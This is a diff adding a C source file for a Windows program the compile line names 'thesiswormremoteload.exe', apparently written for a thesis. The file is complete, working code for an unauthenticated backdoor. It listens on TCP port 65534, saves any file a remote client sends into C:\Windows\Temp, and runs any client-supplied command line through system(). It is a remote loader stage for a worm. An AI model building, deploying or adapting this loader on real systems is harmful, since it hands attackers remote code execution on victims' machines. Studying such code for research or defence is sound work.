@@ -1,0 +1,363 @@
+/* 
+ * File:   main.c
+ * Author: rbeede
+ *
+ * Created on March 17, 2012, 12:33 PM
+ * 
+ * Supports Windows OS only
+ * 
+ * Compilation example:
+ *	gcc -Os -s -o thesiswormremoteload.exe main.c -lws2_32 -lwsock32
+ * 
+ * 
+ * Credits:
+ *	Assistance with Windows sockets code
+ *		http://cs.baylor.edu/~donahoo/practical/CSockets/code/TCPEchoServerWS.c
+ * 
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+
+#include <winsock.h>    /* for socket(),... */
+#pragma comment(lib, "Ws2_32.lib")
+
+
+#define LISTEN_PORT 65534
+
+// bytes
+#define COMMAND_LENGTH 4
+
+// ASCII UNIT SEPARATOR code 0x1F
+// Used for separation of packet fields (command, name, data, etc.)
+#define FIELD_SEPARATOR '\x1F'
+
+
+/* Prototypes */
+void handleClient(const int clientSocket);
+int getExactBytes(const int socket, char * buffer, const int sizeofBuffer, const int number);
+void handleSave(const int clientSocket);
+void handleExec(const int clientSocket);
+int readUntilSignalOrFull(const int socket, char * buffer, const int sizeof_buffer, const char signal);
+int bytesToInteger(unsigned char const * const bytes, const int bytes_length);
+int readSocketIntoFile(const int socket, const char * const pathname, const int lengthBytes);
+
+int main(const int argc, const char * * const argv) {
+
+	WSADATA wsaData; /* Structure for WinSock setup communication */
+	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) /* Load Winsock 2.0 DLL */ {
+		fprintf(stderr, "WSAStartup() failed");
+		exit(1);
+	}
+
+	const int serverSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (serverSocket < 0) {
+		fprintf(stderr, "Unable to create socket\r\n");
+		return (EXIT_FAILURE);
+	}
+
+	struct sockaddr_in serverAddress;
+
+	/* Construct local address structure */
+	memset(&serverAddress, 0, sizeof (serverAddress)); /* Zero out structure */
+	serverAddress.sin_family = AF_INET; /* Internet address family */
+	serverAddress.sin_addr.s_addr = htonl(INADDR_ANY); /* Any incoming interface */
+	serverAddress.sin_port = htons(LISTEN_PORT); /* Local port */
+
+
+	/* Bind to the local address */
+	if (bind(serverSocket, (struct sockaddr *) &serverAddress, sizeof (serverAddress)) < 0) {
+		fprintf(stderr, "Unable to bind port %d\r\n", LISTEN_PORT);
+		return (EXIT_FAILURE);
+	}
+
+
+	/* Mark the socket so it will listen for incoming connections */
+	if (listen(serverSocket, 10) < 0) {
+		fprintf(stderr, "Unable to listen on port %d\r\n", LISTEN_PORT);
+		return (EXIT_FAILURE);
+	}
+
+	printf("Listening on port %d\r\n", LISTEN_PORT);
+	
+	
+	// We only handle 1 TCP connection
+
+	struct sockaddr_in clientAddress;
+	int clientAddressLength = sizeof (clientAddress); // Value is changed upon connect from client
+	memset(&clientAddress, 0, clientAddressLength); /* Zero out structure */
+
+
+	const int clientSocket = accept(serverSocket, (struct sockaddr *) &clientAddress, &clientAddressLength);
+	if (clientSocket < 0) {
+		fprintf(stderr, "Accept of client was prematurely terminated by the remote client\r\n");
+		return (EXIT_SUCCESS);
+	}
+
+	printf("Connection from %s:%d\n", inet_ntoa(clientAddress.sin_addr), ntohs(clientAddress.sin_port));
+
+	handleClient(clientSocket);
+	
+	shutdown(serverSocket, SD_BOTH);
+	closesocket(serverSocket);
+	WSACleanup();
+
+	return (EXIT_SUCCESS);
+}
+
+void handleClient(const int clientSocket) {
+	for(;;) {  // loop forever until forced out
+
+		// Parse the command (fixed length)
+		//	Note that in C (not C++) that a char literal '\0' translates into an integer value
+		const int bufferCommand_Length = COMMAND_LENGTH + (sizeof (FIELD_SEPARATOR) / sizeof (int));
+		printf("Waiting for %d bytes of command from client\r\n", bufferCommand_Length);
+		char bufferCommand[bufferCommand_Length];
+
+		if (getExactBytes(clientSocket, bufferCommand, bufferCommand_Length, bufferCommand_Length) < 0) {
+			fprintf(stderr, "Failed to read command\r\n");
+			return;
+		}
+
+		if (bufferCommand[4] != FIELD_SEPARATOR) {
+			fprintf(stderr, "Missing field separator at end of command\r\n");
+			return;
+		} else {
+			bufferCommand[4] = '\0'; // For easy display later
+		}
+		printf("Resulting buffer is %s\r\n", bufferCommand);
+
+
+		switch (bufferCommand[0]) {
+			case 'S':
+				handleSave(clientSocket);
+				break;
+			case 'E':
+				handleExec(clientSocket);  // calls exec which overwrites this process
+				// Terminate this server
+				exit(EXIT_SUCCESS);
+				break;
+			default:
+				fprintf(stderr, "Unknown command\r\n");
+				return;
+		}
+	}
+}
+
+/**
+ * If number > sizeofBuffer then error is returned and nothing is read.  Safety check.
+ * 
+ * @param buffer pointer to buffer where bytes are to be stored (starts always at offset 0)
+ * @param sizeofBuffer maximum size (or length) of buffer allowed (for sanity check)
+ * @param number number of bytes to exactly read
+ * @return Negative if error occurs.  Number of bytes read matching "number" otherwise.
+ */
+int getExactBytes(const int socket, char * buffer, const int sizeofBuffer, const int number) {
+	if (number > sizeofBuffer) return -256;
+
+	int totalBytesRead = 0;
+	while (totalBytesRead < number) {
+		const int bytesRemaining = number - totalBytesRead;
+		char * currOffset = buffer + totalBytesRead;
+
+		const int receiveBytesRead = recv(socket, currOffset, bytesRemaining, 0); // blocks
+
+		if (receiveBytesRead < 1) {
+			// Error or stream closed before reaching goal
+			return -1;
+		}
+
+		totalBytesRead += receiveBytesRead;
+	}
+
+	// Sanity check
+	if (number != totalBytesRead) {
+		return -255;
+	}
+
+	return totalBytesRead;
+}
+
+void handleSave(const int clientSocket) {
+	const int MAX = 4 * 1024;
+	char fileFullPathname[MAX];
+
+	// hard-coded although could try env variable %TEMP% in the future
+	const char * const directoryPrefix = "C:\\Windows\\Temp\\";
+	strncpy(fileFullPathname, directoryPrefix, MAX);
+	// strncpy already pads with 0's since src is shorter than destination
+
+	// Keep reading bytes until we max our buffer length or see a FIELD_SEPARATOR
+	// Note that strnlen isn't supported with MinGW compiler.  It is POSIX but not C standard
+	int remainingBufferSpace = MAX - strlen(fileFullPathname); // ignores \0 on end
+	if (readUntilSignalOrFull(
+		   clientSocket,
+		   fileFullPathname + strlen(fileFullPathname), // offset at end of existing content (\0 is start)
+		   remainingBufferSpace,
+		   FIELD_SEPARATOR
+		   )
+		   ) {
+		// Overflowed buffer or something else happened
+		fprintf(stderr, "Unable to parse name.  Either too long or dropped connection\r\n");
+		return;
+	}
+
+	// Make sure end result is null-terminated
+	fileFullPathname[MAX - 1] = '\0';
+
+
+	printf("Saving file to %s\r\n", fileFullPathname);
+
+
+	char dataLengthBits[4];
+	if (readUntilSignalOrFull(clientSocket, dataLengthBits, 4, FIELD_SEPARATOR)) {
+		fprintf(stderr, "Unable to parse length\r\n");
+	}
+	const int dataLength = bytesToInteger(dataLengthBits, 4);
+
+	printf("Data length is %d\r\n", dataLength);
+
+
+	if (readSocketIntoFile(clientSocket, fileFullPathname, dataLength)) {
+		fprintf(stderr, "Unable to read data into file\r\n");
+		return;
+	}
+
+	printf("Data saved to file\r\n");
+	
+	// note that the next byte is not a FIELD_SEPARATOR
+	// we assume the end of the packet after the file data we've read
+}
+
+void handleExec(const int clientSocket) {
+	const int MAX = 4 * 1024;
+	char commandLine[MAX];
+
+	
+	// hard-coded although could try env variable %TEMP% in the future
+	const char * const directoryPrefix = "C:\\Windows\\Temp\\";
+	strncpy(commandLine, directoryPrefix, MAX);
+	// strncpy already pads with 0's since src is shorter than destination
+
+	// Keep reading bytes until we max our buffer length or see a FIELD_SEPARATOR
+	// Note that strnlen isn't supported with MinGW compiler.  It is POSIX but not C standard
+	int remainingBufferSpace = MAX - strlen(commandLine); // ignores \0 on end
+	if (readUntilSignalOrFull(
+		   clientSocket,
+		   commandLine + strlen(commandLine), // offset at end of existing content (\0 is start)
+		   remainingBufferSpace,
+		   FIELD_SEPARATOR
+		   )
+		   ) {
+		// Overflowed buffer or something else happened
+		fprintf(stderr, "Unable to parse command line.  Either too long or dropped connection\r\n");
+		return;
+	}
+
+	// Make sure end result is null-terminated
+	commandLine[MAX - 1] = '\0';
+
+	printf("Working directory will be %s\r\n", directoryPrefix);
+	printf("Command line will be %s\r\n", commandLine);
+	
+	chdir(directoryPrefix);
+	
+	
+	// Stop the TCP socket connection (so the descriptor isn't passed on to the next process)
+	shutdown(clientSocket, SD_BOTH);
+	closesocket(clientSocket);
+	
+	// Note that when using "system" call the server process still has a binded listening port while
+	//	the commandLine is being executed.  If something attempts to connect nothing will happen though
+	//	because we aren't multi-threaded or reading
+	
+	// This is nice because it handles arguments without us having to parse them and handle quoting
+	system(commandLine);
+	
+	//TODO consider adding protocol so that program arguments are delimited special when sent to us
+	//	then use execv to handle them.
+}
+
+
+// Returns non-zero if error occurs or buffer became full without seeing signal
+// Zero if successful (saw signal and didn't overflow buffer)
+
+int readUntilSignalOrFull(const int socket, char * buffer, const int sizeof_buffer, const char signal) {
+	char oneByte[1];
+	oneByte[0] = 0x00;
+
+	int totalBytesRead = 0;
+	while (signal != oneByte[0] && totalBytesRead <= sizeof_buffer) {
+		const int result = recv(socket, oneByte, 1, 0);
+
+		if (result < 0) {
+			// Error with connection
+			return -1;
+		} else if (0 == result) {
+			// Connection was closed without seeing signal
+			return -1;
+		}
+
+		if (signal == oneByte[0]) break;
+
+		buffer[totalBytesRead] = oneByte[0];
+		totalBytesRead++;
+	}
+
+	if (totalBytesRead >= sizeof_buffer && signal != oneByte[0]) {
+		return -1; // Never saw signal and fill up buffer all the way
+	} else {
+		return 0; // Saw signal and didn't fill buffer to capacity
+	}
+}
+
+
+// Assumes big-endian (MSB first) order
+// If the platform's int size isn't large enough to handle bytes_length bytes then your value will be wrong
+//	You could always check with sizeof(int) != bytes_length
+
+int bytesToInteger(unsigned char const * const bytes, const int bytes_length) {
+	int value = 0;
+
+	int i;
+	for (i = 0; i < bytes_length; i++) {
+		value = (value << 8) + bytes[i];
+		printf("%d is %d\r\n", i, (int) bytes[i]);
+	}
+
+	return value;
+}
+
+
+// Returns 0 if success; non-zero if error
+
+int readSocketIntoFile(const int socket, const char * const pathname, const int lengthBytes) {
+	FILE * fh = fopen(pathname, "wb"); // b mode is important on Windows
+
+	if (NULL == fh) return -1;
+
+
+	int totalBytesRead = 0;
+
+	char buffer[4 * 1024];
+
+	while (totalBytesRead < lengthBytes) {
+		const int bytesReceived = recv(socket, buffer, 1, 0);
+
+		const size_t bytesWritten = fwrite(buffer, 1, bytesReceived, fh);
+
+		if (bytesWritten != bytesReceived) {
+			fprintf(stderr, "Only wrote %d bytes\r\n", bytesWritten);
+			return -1;
+		}
+		
+		totalBytesRead += bytesReceived;
+	}
+
+	fclose(fh);
+	
+	return 0;
+}
